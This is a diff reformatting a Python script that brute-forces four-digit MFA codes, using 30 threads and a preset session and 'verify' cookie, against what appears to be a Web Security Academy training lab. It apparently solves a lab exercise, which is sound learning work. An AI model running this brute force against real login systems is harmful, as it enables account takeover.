@@ -5,24 +5,25 @@ base_url = 'https://0a31001003d5c10380c185c30041008e.web-security-academy.net/'
 login2_url = f'{base_url}login2'
 
 cookies = {
-    'session':'DvuqT9mh6Y5y2EQGQnsgMLUxMaklbcyK',
-    'verify':'carlos'
+    'session': 'DvuqT9mh6Y5y2EQGQnsgMLUxMaklbcyK',
+    'verify': 'carlos'
 }
 
 session = requests.Session()
 session.cookies.update(cookies)
 
+
 def check_code(i):
     mfa_code = f'{i:04d}'
     data = {
-        'mfa-code':mfa_code
-        }
-    
+        'mfa-code': mfa_code
+    }
+
     try:
         response = session.post(login2_url, data=data, cookies=cookies, allow_redirects=False, timeout=5)
 
         if response.status_code == 302:
-            print(f'認証コードは{mfa_code}です。')
+            print(f'認証コードは {mfa_code} です。')
 
         if i % 100 == 0:
             print(f"試行中... {mfa_code}")
@@ -33,5 +34,6 @@ def check_code(i):
     return False
 
 
+# スレッドプールで並列にMFAコードを試行する
 with ThreadPoolExecutor(max_workers=30) as executor:
     executor.map(check_code, range(10000))
